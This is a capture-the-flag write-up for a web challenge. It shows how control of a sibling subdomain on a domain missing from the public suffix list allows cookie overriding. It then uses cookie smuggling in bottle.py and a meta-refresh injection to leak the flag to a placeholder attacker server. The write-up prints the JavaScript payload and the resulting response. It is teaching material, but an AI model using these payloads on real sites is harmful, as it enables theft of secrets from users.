# Flag Server

* Round: 43 (2024/03)
* Category: Web
* Points: 150
* Solves: 3

## Description

On this website, you can set your own flag and read it for free!

http://flag.1337.cx/

## Solution

By using whois, you can find `1337.cx` is a domain of `afraid.org`, a free dns and subdomain provider that everyone can use. Combined with the fact that `1337.cx` is not in [public suffix list](https://publicsuffix.org/), owning another subdomain allows you to have a **Same-Site** access to `flag.1337.cx`.

> BTW, there is also some relevant [issue](https://github.com/publicsuffix/list/issues/271) about whether those domain should belong to PSL.

So now you are able to override cookie `flag` on domain `1337.cx` and thus control the reponse, you still can't XSS due to the strict CSP. The intended way is to do a [cookie smuggling](https://blog.ankursundara.com/cookie-bugs/#cookie-smuggling) on bottle.py to control the prefix and suffix of flag, and leak the flag using meta redirect.

```html
<script>
	document.cookie = 'flag="start <meta http-equiv=refresh content=\'0 ; domain=1337.cx; path=/aa' // start
	document.cookie = 'url=https://YOUR_SERVER/leak? ; domain=1337.cx; path=/aa' // mid
	document.cookie = 'z=\'> end" ; domain=1337.cx;' // end
	location = 'http://flag.1337.cx/aa'
</script>
```

And the response would be:

```html
start <meta http-equiv=refresh content='0; url=https://YOUR_SERVER/leak?; flag=REAL_FLAG_HERE; z='> end
```

One of the problem is that you can't insert `;` in your response (needed by meta refresh) becuase that is how cookie are split, so I avoided that by adding another cookie key `url` and let the browset to add `;` for me. Another way is to use octal encoding like `\073`, and this is used by two people who solved this :D
